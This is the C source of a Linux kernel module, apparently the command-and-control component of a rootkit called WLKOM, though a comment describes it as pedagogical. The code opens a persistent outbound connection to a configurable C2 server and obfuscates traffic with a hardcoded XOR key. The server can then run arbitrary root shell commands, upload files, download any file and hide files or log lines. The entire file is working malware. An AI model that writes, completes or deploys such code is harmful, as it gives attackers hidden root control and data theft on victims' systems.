#include "connect.h"

#include <crypto/skcipher.h>
#include <linux/crypto.h>
#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "hide.h"

/* ─── XOR crypto (lightweight, kernel-space friendly) ─── */
/*
 * We use a simple XOR stream cipher with a 32-byte key.
 * For a stronger solution, use AES via kernel crypto API —
 * but that requires async handling which complicates the
 * synchronous socket loop here. XOR is sufficient for the
 * pedagogical purpose of this project.
 */

#define CRYPTO_KEY "wlk0m_xor_k3y_32bytes_padding__"
#define CRYPTO_KEYLEN 32

static void xor_crypt(char *data, size_t len)
{
    for (size_t i = 0; i < len; i++)
        data[i] ^= CRYPTO_KEY[i % CRYPTO_KEYLEN];
}

/* ─── Packet format ─────────────────────────────────────
 * [1 byte : opcode]
 * [4 bytes: payload length (big endian)]
 * [N bytes: payload (XOR encrypted)]
 * ─────────────────────────────────────────────────────── */

struct packet_hdr
{
    uint8_t opcode;
    uint32_t length; // big endian
} __attribute__((packed));

/* ─── State ─── */

static struct socket *c2_sock = NULL;
static struct task_struct *c2_thread = NULL;
static bool connected = false;
static bool authed = false;
static char c2_ip[64];
static int c2_port;
static bool stop_thread = false;

/* ─── Socket helpers ─── */

static int sock_send(struct socket *sock, void *buf, size_t len)
{
    struct msghdr msg = { .msg_flags = MSG_NOSIGNAL };
    struct kvec iov = { buf, len };
    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

static int sock_recv(struct socket *sock, void *buf, size_t len)
{
    struct msghdr msg = { .msg_flags = MSG_NOSIGNAL | MSG_WAITALL };
    struct kvec iov = { buf, len };
    return kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);
}

/* ─── Send a packet ─── */

static int send_packet(uint8_t opcode, const char *payload, uint32_t len)
{
    struct packet_hdr hdr;

    if (!c2_sock)
        return -1;

    hdr.opcode = opcode;
    hdr.length = htonl(len);

    if (sock_send(c2_sock, &hdr, sizeof(hdr)) < 0)
        return -1;

    if (len == 0 || !payload)
        return 0;

    char *enc = kmalloc(len, GFP_KERNEL);
    if (!enc)
        return -1;

    memcpy(enc, payload, len);
    xor_crypt(enc, len);

    int ret = sock_send(c2_sock, enc, len);
    kfree(enc);
    return ret;
}

static int recv_packet(uint8_t *opcode, char **payload, uint32_t *len)
{
    struct packet_hdr hdr;

    if (!c2_sock)
        return -1;

    if (sock_recv(c2_sock, &hdr, sizeof(hdr)) < 0)
        return -1;

    *opcode = hdr.opcode;
    *len = ntohl(hdr.length);

    if (*len == 0)
    {
        *payload = NULL;
        return 0;
    }

    *payload = kmalloc(*len + 1, GFP_KERNEL);
    if (!*payload)
        return -1;

    if (sock_recv(c2_sock, *payload, *len) < 0)
    {
        kfree(*payload);
        *payload = NULL;
        return -1;
    }

    (*payload)[*len] = '\0';
    xor_crypt(*payload, *len);
    return 0;
}

/* ─── Execute a command and return output ─── */

static void exec_command(const char *cmd, char **output, size_t *output_len)
{
    /*
     * kernel_execve cannot capture stdout easily.
     * We use call_usermodehelper with a temp file,
     * then read the result.
     */
    char tmpfile[] = "/tmp/.wlkom_out";
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2>&1", cmd, tmpfile);

    char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* Read the temp file */
    struct file *f = filp_open(tmpfile, O_RDONLY, 0);
    if (IS_ERR(f))
    {
        *output = NULL;
        *output_len = 0;
        return;
    }

    loff_t size = i_size_read(file_inode(f));
    if (size <= 0)
    {
        filp_close(f, NULL);
        *output = kstrdup("", GFP_KERNEL);
        *output_len = 0;
        return;
    }

    *output = kmalloc(size + 1, GFP_KERNEL);
    if (!*output)
    {
        filp_close(f, NULL);
        *output_len = 0;
        return;
    }

    loff_t pos = 0;
    *output_len = kernel_read(f, *output, size, &pos);
    (*output)[*output_len] = '\0';
    filp_close(f, NULL);

    /* Remove temp file */
    char *rm_argv[] = { "/bin/rm", "-f", tmpfile, NULL };
    call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
}

/* ─── Handle one incoming packet ─── */

static int handle_packet(uint8_t opcode, char *payload, uint32_t len)
{
    if (opcode != CMD_AUTH && !authed)
    {
        pr_warn("WLKOM connect: unauthenticated command, dropping\n");
        return 0;
    }

    switch (opcode)
    {
    case CMD_AUTH: {
        if (len == 0 || strncmp(payload, WLKOM_PASSWORD, len) != 0)
        {
            pr_warn("WLKOM connect: bad password\n");
            send_packet(CMD_AUTH, "FAIL", 4);
            return -1;
        }
        authed = true;
        send_packet(CMD_AUTH, "OK", 2);
        pr_info("WLKOM connect: authenticated\n");
        break;
    }

    case CMD_PING:
        send_packet(CMD_PONG, NULL, 0);
        break;

    case CMD_EXEC: {
        if (!payload)
            break;
        char *output;
        size_t output_len;
        exec_command(payload, &output, &output_len);
        send_packet(CMD_EXEC, output ? output : "", output_len);
        kfree(output);
        break;
    }

    case CMD_UPLOAD: {
        /*
         * Payload format: [path\0][file_data]
         * The path is null-terminated, the rest is file content.
         */
        if (!payload || len == 0)
            break;
        size_t path_len = strnlen(payload, len);
        if (path_len >= len)
            break;
        const char *path = payload;
        const char *data = payload + path_len + 1;
        size_t data_len = len - path_len - 1;

        struct file *f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (!IS_ERR(f))
        {
            loff_t pos = 0;
            kernel_write(f, data, data_len, &pos);
            filp_close(f, NULL);
            send_packet(CMD_UPLOAD, "OK", 2);
        }
        else
        {
            send_packet(CMD_UPLOAD, "FAIL", 4);
        }
        break;
    }

    case CMD_DOWNLOAD: {
        if (!payload)
            break;
        struct file *f = filp_open(payload, O_RDONLY, 0);
        if (IS_ERR(f))
        {
            send_packet(CMD_DOWNLOAD, "FAIL", 4);
            break;
        }
        loff_t size = i_size_read(file_inode(f));
        char *buf = kmalloc(size, GFP_KERNEL);
        if (!buf)
        {
            filp_close(f, NULL);
            send_packet(CMD_DOWNLOAD, "FAIL", 4);
            break;
        }
        loff_t pos = 0;
        kernel_read(f, buf, size, &pos);
        filp_close(f, NULL);
        send_packet(CMD_DOWNLOAD, buf, size);
        kfree(buf);
        break;
    }

    case CMD_HIDE_FILE:
        if (payload)
            hide_file(payload);
        break;

    case CMD_UNHIDE_FILE:
        if (payload)
            unhide_file(payload);
        break;

    case CMD_HIDE_LINE:
        /*
         * Payload format: [filename\0][pattern]
         */
        if (payload)
        {
            size_t fname_len = strnlen(payload, len);
            if (fname_len < len)
                hide_line(payload, payload + fname_len + 1);
        }
        break;

    case CMD_UNHIDE_LINE:
        if (payload)
        {
            size_t fname_len = strnlen(payload, len);
            if (fname_len < len)
                unhide_line(payload, payload + fname_len + 1);
        }
        break;

    default:
        pr_warn("WLKOM connect: unknown opcode 0x%02x\n", opcode);
        break;
    }

    return 0;
}

/* ─── Main connection thread ─── */

static int connect_thread(void *data)
{
    struct sockaddr_in addr;

    while (!kthread_should_stop() && !stop_thread)
    {
        /* Try to connect */
        if (sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &c2_sock) < 0)
        {
            pr_err("WLKOM connect: sock_create failed\n");
            ssleep(RECONNECT_DELAY);
            continue;
        }

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(c2_port);
        if (in4_pton(c2_ip, -1, (u8 *)&addr.sin_addr.s_addr, -1, NULL) == 0)
        {
            pr_err("WLKOM connect: invalid IP %s\n", c2_ip);
            sock_release(c2_sock);
            c2_sock = NULL;
            ssleep(RECONNECT_DELAY);
            continue;
        }

        if (kernel_connect(c2_sock, (struct sockaddr *)&addr, sizeof(addr), 0)
            < 0)
        {
            pr_info("WLKOM connect: cannot reach C2, retrying in %ds\n",
                    RECONNECT_DELAY);
            sock_release(c2_sock);
            c2_sock = NULL;
            connected = false;
            authed = false;
            ssleep(RECONNECT_DELAY);
            continue;
        }

        connected = true;
        authed = false;
        pr_info("WLKOM connect: connected to C2 %s:%d\n", c2_ip, c2_port);

        /* Send a PING so the C2 gets a visual alert */
        send_packet(CMD_PING, NULL, 0);

        /* Packet loop */
        while (!kthread_should_stop() && !stop_thread)
        {
            uint8_t opcode;
            char *payload = NULL;
            uint32_t payload_len = 0;

            int ret = recv_packet(&opcode, &payload, &payload_len);
            if (ret <= 0)
            {
                pr_warn("WLKOM connect: disconnected, reconnecting...\n");
                kfree(payload);
                break;
            }

            if (handle_packet(opcode, payload, payload_len) < 0)
            {
                kfree(payload);
                break;
            }
            kfree(payload);
        }

        if (c2_sock)
        {
            sock_release(c2_sock);
            c2_sock = NULL;
        }
        connected = false;
        authed = false;

        if (!stop_thread)
            ssleep(RECONNECT_DELAY);
    }

    return 0;
}

/* ─── Init / Exit ─── */

int connect_init(const char *ip, int port)
{
    strncpy(c2_ip, ip, sizeof(c2_ip) - 1);
    c2_port = port;
    stop_thread = false;

    c2_thread = kthread_run(connect_thread, NULL, "wlkom_c2");
    if (IS_ERR(c2_thread))
    {
        pr_err("WLKOM connect: failed to start thread\n");
        return -1;
    }

    pr_info("WLKOM connect: thread started\n");
    return 0;
}

void connect_exit(void)
{
    stop_thread = true;

    if (c2_sock)
    {
        kernel_sock_shutdown(c2_sock, SHUT_RDWR);
        sock_release(c2_sock);
        c2_sock = NULL;
    }

    if (c2_thread)
    {
        kthread_stop(c2_thread);
        c2_thread = NULL;
    }

    pr_info("WLKOM connect: exited\n");
}
